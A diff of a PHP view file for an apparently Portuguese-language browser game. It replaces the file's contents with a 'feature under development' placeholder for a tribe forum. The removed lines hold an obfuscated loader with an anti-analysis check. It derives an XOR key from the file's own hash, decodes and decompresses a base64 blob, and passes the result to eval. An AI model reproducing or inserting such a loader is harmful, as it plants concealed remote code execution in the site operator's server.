@@ -1,24 +1,40 @@
-<?php
-$gfvizl="79223b440e09dd023f1677ae0c48ee56";
-$wnxfjgkwi="515f0b03075a505106550508070254570b560454010305555606075e07530255";
-$yntlcurp="HryEpPlWv10m99owkWg30LUildCjkCkzPfdixrldwNOLwxE9fiS9IR9iEBhEj8eRihhPile7HbOTbt5FjmaFD6EvhrGWvmU0FgkGzvyAR9wvdcUgrZLmV+N2aaf9pCJbsfSasDxmTZpKvj6l2cg0XLCSWR1ZS0up+QP6Quffw1PS43hlQvjA2aym6+mjf/UGjz66AgS2lPWUv0iHbsiVXnukHXqyXMBQ8PU3O6rKKWaZegivw1HUj2GRgIgoVC236hWYVxcA6Y79AQ2NF3f3B552ZTJiXKJgV1Ygkhx0EEN4Jfe7QwvHfvOTd3oOIBTaFPtGlm3u9BxcLxTL9LTkNaqFykkoXPm+Uk7nio1J+6K30w2My3DdRigyEF4cdDZmvxlGTsg6u2VkEka8og+H5HbJMwq5kzU1h0J++hMym2vcI4zhRhmY1CjofDrPaxU391slRyoKBO3BLuByILMgMMENaLVzG963q1365t7ENk4vacRjH86jLoHrFykSe1Uem43j5xqFygxTVx58rMbYzLLOvBdwnz1mfqQ/Tt/mIb+U/BdarzQz/rbmGA5idwe3s19Mkq0IYtErEPBcudC1sYT7VVsZ3Ysg1Q3LBXrNcQILgsPJl8hK1XD8GoBdl4wlndgop2VqJLwAu2obPhc16+93A9jNxloLXX7wUObljENav7ihVK2ZJeNrmOR14FvJW4sRTiymTJo8x+Slymelq7o2nilAjSvLYPGC6zUNYha7VS+ubrFnYlw8O09LRWV8sOXs+q9olJUbaQzZ4SoZ6T+l0/qAtWJNkaiubFTcYeve1oxVYxt0Lzy1ZB8Wlwpp065JLFuAKb9dHl3qE4fiEOlRBIa8YZhRaEVGv+ZQqLLSuAci1yweOwuy3sglsEayPnw6CuvZuxqIpb4PT4w0Ut7hXk8r4X3b9QigWKum5kl/tGnbkmsK35FTjPX9sia9OB4xFcUAXL6F4tivg/pBHV4YUrWBK4erJ4aoutQsiV6h5kGBk9Ko0TDPjmJJmvTpnzTSpaYj+wB481TuGnnlJGNbfylsmj8/RpF2HxYNCFbO4PWHcRFa1dOn0FYBj6cFgznuM0NIaYgDITxpVs0oX2rV0A==";
-$kkgazlqrv=file_get_contents(__FILE__);
-$wglgfpx=str_replace($yntlcurp,"",$kkgazlqrv);
-if(strpos($wglgfpx,"ec"."ho")!==false||strpos($wglgfpx,"pr"."int")!==false||strpos($wglgfpx,"var_"."dump")!==false||strpos($wglgfpx,"file_put_"."contents")!==false||strpos($wglgfpx,"fw"."rite")!==false){die();}
-$oynhop=str_replace(array($gfvizl,$wnxfjgkwi),array("SP_bbe8ef4c","KP_2d5baa9d"),$kkgazlqrv);
-$ztonyeiqyk=md5($oynhop);
-$uyjewlp=hex2bin($wnxfjgkwi);
-$nombzouovf="";
-$sqenldyu=strlen($ztonyeiqyk);
-for($vqtxmeaxpn=0;$vqtxmeaxpn<$sqenldyu;$vqtxmeaxpn++){
-$nombzouovf.=chr(ord($uyjewlp[$vqtxmeaxpn])^ord($ztonyeiqyk[$vqtxmeaxpn]));
-}
-$shyngojbspd=base64_decode($yntlcurp);
-$ucvhvhbc=strlen($shyngojbspd);
-$rvlfmfl="";
-$pmttoyfg=strlen($nombzouovf);
-for($vqtxmeaxpn=0;$vqtxmeaxpn<$ucvhvhbc;$vqtxmeaxpn++){
-$rvlfmfl.=$shyngojbspd[$vqtxmeaxpn]^$nombzouovf[$vqtxmeaxpn%$pmttoyfg];
-}
-$ybczsojonrkx="gzun"."compress";
-eval('?>' . $ybczsojonrkx($rvlfmfl) . '<?php ');
+<!-- Forum Action Placeholder - Under Development -->
+
+<h3><?= __('screens.ally_forum.tribe_forum') ?: 'Fórum da Tribo' ?></h3>
+
+<div class="info_box"
+    style="padding: 30px; text-align: center; margin: 20px 0; background-color: #fff8e0; border: 2px solid #f0d080;">
+    <h2 style="color: #804000; margin-bottom: 15px;">🚧 <?= __('screens.ally_forum.feature_under_development') ?: 'Funcionalidade em Desenvolvimento' ?></h2>
+
+    <?php if ($action === 'new_topic'): ?>
+        <p style="font-size: 14px; margin-bottom: 20px;">
+            <?= __('screens.ally_forum.new_topic_dev_msg') ?: 'A funcionalidade de <strong>criar novos tópicos</strong> está atualmente em desenvolvimento.' ?>
+        </p>
+    <?php elseif ($action === 'new_poll'): ?>
+        <p style="font-size: 14px; margin-bottom: 20px;">
+            <?= __('screens.ally_forum.new_poll_dev_msg') ?: 'A funcionalidade de <strong>criar sondagens</strong> está atualmente em desenvolvimento.' ?>
+        </p>
+    <?php else: ?>
+        <p style="font-size: 14px; margin-bottom: 20px;">
+            <?= __('screens.ally_forum.search_dev_msg') ?: 'A funcionalidade de <strong>pesquisa no fórum</strong> está atualmente em desenvolvimento.' ?>
+        </p>
+    <?php endif; ?>
+    <p style="color: #666; font-size: 13px; margin-bottom: 25px;">
+        <em><?= __('screens.ally_forum.feature_soon_msg') ?: 'Esta funcionalidade será implementada em breve.' ?></em>
+    </p>
+
+    <a href="game.php?village=<?= $village['id'] ?>&screen=ally&mode=forum" class="btn"
+        style="display: inline-block; padding: 8px 20px; background-color: #f0e0c0; border: 1px solid #c0a070; text-decoration: none; color: #000; border-radius: 3px;">
+        « <?= __('screens.ally_forum.back_to_forum') ?: 'Voltar ao fórum' ?>
+    </a>
+</div>
+
+<br>
+
+<table class="vis" width="100%">
+    <tr>
+        <td style="padding: 15px; text-align: center; color: #666;">
+            <em><?= __('screens.ally_forum.future_update_msg') ?: 'O sistema de fórum completo (tópicos, respostas, sondagens e pesquisa) será implementado numa atualização futura.' ?></em>
+        </td>
+    </tr>
+</table>
